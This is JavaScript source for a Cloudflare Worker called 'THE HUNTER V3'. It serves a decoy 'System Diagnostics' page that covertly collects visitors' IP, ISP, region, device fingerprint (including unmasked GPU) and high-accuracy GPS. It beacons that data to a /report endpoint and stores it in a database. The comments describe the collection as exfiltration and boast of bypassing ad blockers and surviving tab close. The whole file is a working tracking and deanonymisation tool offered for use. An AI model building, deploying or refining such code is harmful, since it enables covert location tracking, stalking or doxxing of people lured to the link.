/**
 * THE HUNTER V3 - "POLYMORPHIC STORAGE"
 * 1. Server-Side Geo-Lock (Bypasses AdBlockers)
 * 2. Beacon Exfiltration (Survives Tab Close)
 * 3. Schema-Adaptive Storage (No DB Migration needed)
 */

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // --- 1. CORS CONFIGURATION ---
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // --- 2. REPORT ENDPOINT (Data Receiver) ---
    if (request.method === "POST" && url.pathname === "/report") {
      try {
        let data;
        const contentType = request.headers.get("content-type") || "";
        if (contentType.includes("application/json")) {
          data = await request.json();
        } else {
          const text = await request.text();
          data = JSON.parse(text);
        }

        const { visitId, type, payload } = data;
        
        let query = "";
        let params = [];

        // ADAPTIVE SQL: We map new data to your EXISTING columns
        if (type === "gps") {
          // If you have precise_lat/_lon columns, use them.
          // If not, we'll try to update them, but wrap in try/catch in case.
          query = `UPDATE visits SET precise_lat = ?, precise_lon = ? WHERE uuid = ?`;
          params = [payload.lat, payload.lon, visitId];
          
          // Fallback: Also save to timing_data just in case precise_lat fails later
          // We append this GPS data to whatever is in timing_data
          const backupGPS = ` | [GPS: ${payload.lat}, ${payload.lon}, Acc:${payload.acc}]`;
          const backupQuery = `UPDATE visits SET timing_data = timing_data || ? WHERE uuid = ?`;
          await env.DB.prepare(backupQuery).bind(backupGPS, visitId).run().catch(() => {});
        } 
        else if (type === "specs") {
            // Save device fingerprint into 'user_agent' (appending it) or 'timing_data'
            // We'll replace user_agent with the full JSON because it's usually a text field
            query = `UPDATE visits SET user_agent = ? WHERE uuid = ?`;
            params = [JSON.stringify(payload), visitId];
        }

        if (query) {
          await env.DB.prepare(query).bind(...params).run();
        }

        return new Response("ok", { headers: corsHeaders });

      } catch (e) {
        console.error("DB Write Error", e);
        return new Response("error", { status: 200, headers: corsHeaders });
      }
    }

    // --- 3. SERVE PAYLOAD (GET) ---
    if (request.method === "GET") {
      const visitId = crypto.randomUUID();
      
      // SERVER-SIDE DATA (The "Pro" Stuff)
      const cf = request.cf || {};
      const ip = request.headers.get("CF-Connecting-IP") || "127.0.0.1";
      const city = cf.city || "Unknown";
      const country = cf.country || "XX";
      
      // PACKING EXTRA DATA:
      // Since your DB lacks 'region'/'isp' columns, we pack them into 'timing_data'
      // or append to 'user_agent' so you still get the info.
      const region = cf.region || "Unknown";
      const isp = cf.asOrganization || "Unknown ISP";
      const roughLat = cf.latitude || 0;
      const roughLon = cf.longitude || 0;

      const richMetadata = `[ISP: ${isp}] [Region: ${region}] [RoughLoc: ${roughLat},${roughLon}]`;

      try {
        // We INSERT into the columns we KNOW you have.
        // We put the extra "Pro" data into 'timing_data' immediately.
        await env.DB.prepare(
          `INSERT INTO visits (uuid, ip, city, country, timestamp, timing_data) 
           VALUES (?, ?, ?, ?, ?, ?)`
        ).bind(
          visitId, 
          ip, 
          city, 
          country, 
          new Date().toISOString(),
          richMetadata // <--- Saving the ISP/Region info here!
        ).run();
      } catch (e) {
        return new Response("Database Init Failed: " + e.message, { status: 500 });
      }

      return new Response(renderPayload(visitId), {
        headers: { "Content-Type": "text/html" }
      });
    }

    return new Response("Not Found", { status: 404 });
  }
};

// --- CLIENT PAYLOAD (Unchanged - works perfectly) ---
function renderPayload(visitId) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostics</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .log-container { width: 90%; max-width: 600px; text-align: left; }
        .log-entry { margin: 5px 0; opacity: 0; animation: fadeIn 0.5s forwards; }
        .success { color: #3fb950; }
        .error { color: #f85149; }
        @keyframes fadeIn { to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="log-container" id="log">
        <div class="log-entry">Initializing diagnostics...</div>
    </div>

    <script>
        const VISIT_ID = "${visitId}";
        const LOG = document.getElementById('log');

        function log(msg, type = '') {
            const div = document.createElement('div');
            div.className = 'log-entry ' + type;
            div.innerText = "> " + msg;
            LOG.appendChild(div);
        }

        // --- EXFILTRATION ---
        function sendData(type, payload) {
            const data = JSON.stringify({ visitId: VISIT_ID, type, payload });
            if (navigator.sendBeacon) {
                const blob = new Blob([data], { type: 'application/json' });
                navigator.sendBeacon('/report', blob);
            } else {
                fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: data,
                    keepalive: true
                }).catch(() => {});
            }
        }

        // --- FINGERPRINT ---
        function runFingerprint() {
            log("Analyzing hardware...");
            const fp = {
                ua: navigator.userAgent,
                cores: navigator.hardwareConcurrency || 'unknown',
                mem: navigator.deviceMemory || 'unknown',
                screen: window.screen.width + 'x' + window.screen.height,
                gpu: 'unknown'
            };
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fp.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            sendData('specs', fp);
            log("Hardware profile uploaded.", "success");
        }

        // --- GPS ---
        function runGPS() {
            if (!navigator.geolocation) {
                log("GPS Hardware not detected.", "error");
                return;
            }
            log("Requesting satellite lock...");
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    log("Precision lock acquired (" + pos.coords.accuracy + "m)", "success");
                    sendData('gps', {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    });
                },
                (err) => {
                    log("GPS Lock Failed: " + err.code, "error");
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        setTimeout(runFingerprint, 500);
        setTimeout(runGPS, 1500);
    </script>
</body>
</html>
  `;
}